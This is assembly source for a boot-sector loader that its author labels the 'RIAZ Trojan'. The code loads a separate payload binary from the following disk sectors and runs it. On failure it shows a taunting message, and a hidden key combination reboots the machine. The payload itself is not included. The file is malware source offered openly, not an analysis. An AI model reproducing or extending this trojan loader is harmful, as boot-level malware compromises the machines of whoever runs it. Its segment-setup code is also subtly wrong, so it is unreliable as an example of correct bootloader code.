BITS 16 ; we tell bios we work in 16 bits
org 0x7c00 ; bootloader magic number

%define SECTORS 0x05  ; precompiler defined value for easy changing, 5 sectors
; change this to another number if you require more memory.
; remember to sync the same value on payload.asm because
; otherwise it wont work.

; i also wonder who would fill more than 2560 bytes if its not an image...

disk_sg:
    cli ; cli = clear interrupts, clear any interrupt that is working
    ;Setup segments
	
    xor ax, ax                  ;AX=0
    mov ax, ds                  ;DS=ES=0 because we use an org of 0x7c00 - Segment<<4+offset = 0x0000<<4+0x7c00 = 0x07c00
    mov ax, es
    mov ax, ss
    mov sp, 0x7c00              ;SS:SP= 0x0000:0x7c00 stack just below bootloader
    sti ; sti = set interrupt flag, this allows the processor to respond to maskable hardware interrupts
	
; once the disk segments are prepared, we can safely access any sector we want, read or write, in this case we will read

boot:
	; reset the disk controller
	mov ax, 0x00 
	int 0x13

	mov bx, 0x8000           ; bx = address to write the kernel to
	mov al, SECTORS	 	 ; al = amount of sectors to read
	mov ch, 0x00             ; cylinder/track = 0
	mov dh, 0x00             ; head           = 0
	mov cl, 0x02             ; sector         = 2
	mov ah, 0x02             ; ah = 2: read from drive
	int 0x13   		 ; => ah = status, al = amount read
	jc r_error		 ; if we don't find somehow the address or the binary, display the message
	
	jmp 0x8000 ; if everything went ok, we can load our kernel with the payload
	
r_error:
	; quickly prepare the video mode
	mov ax, 0x02 ; classic old text mode...
	int 0x10 ; video interrupt
	
	; since we are in text mode, we can get a blinking screen, so to fix that 
	mov ax, 0x1003	; to turn off the blinking attribute  
    	mov bl, 0x00
    	int 0x10
	
	; prepare the screen color to a predefined ones [black - red]
    	mov ah, 0x07
   	mov al, 0x00
    	mov bh, 0x0C 
    	mov cx, 0x0000
    	mov dx, 0x184f
    	int 0x10
	
	; set a correct cursor position to start printing the text
	mov ah, 0x02 ; parameter ah = 0x02 -> cursor
	xor bh, bh ; let page to 0
	mov dh, 11 ; row
	mov dl, 7 ; column
	int 0x10  

	; draw the title line
	line:
		mov ah, 0x06 	; parameter ah = 0x06 -> drawing
		mov al, 0x01	; al = lines to scroll
		mov bh, 0x4C	; bh = bg and foreground color
		mov ch, 11	; ch = upper row number
		xor cl, cl	; cl = left column number
		mov dh, 11	; dh = lower row number
		mov dl, 80	; dl = right column number
		int 0x10
	
	; display text to the user
	print:
		mov si, message ; define the message
		
		next:
			mov al,[si] ; move the si byte which stores our text to “al”, to later, be compared
			cmp al,0 ; check if the last byte, “or char”, is 0.
			je done ; if that byte compared is 0? we are done, else, continue reading
			call printchar ; call the teletype function to print text
			inc si ; increase the counter “si”, which contains our text bytes
			jmp next ; repeat the operation again, until it checks 0

		printchar: ; the printchar service
			mov ah,0x0e
			int 0x10
			ret ; return function
	
	message db "[I can't load my power here... Damn, the president will be mad...]",10,13,10,13,"                               	 RIAZ Trojan 	",0
					
done:
	; get rid from the bootloader if the payload fails (if the user presses the following combination)
	mov ax, 0 ; we don't care really what is pressed, just check the combination stored in al, even tho its a little incosistent
	int 0x16
	cmp al, "F" ;(SHIFTING and F)
	je delete
	jmp done
	
delete:
	; removed for exploiting reasons.

	; case SHIFT+F is detected we restart the computer, feel free to add everything
	; you want here once any key is pressed (such an easter egg or whatever)
	; (which tbh i find pointless since there are already few bytes left)
	int 0x19
	
	ret

; end the bootloader
times 510 - ($-$$) db 0
dw 0xaa55 ; bootloader signature
incbin "\payload.bin"
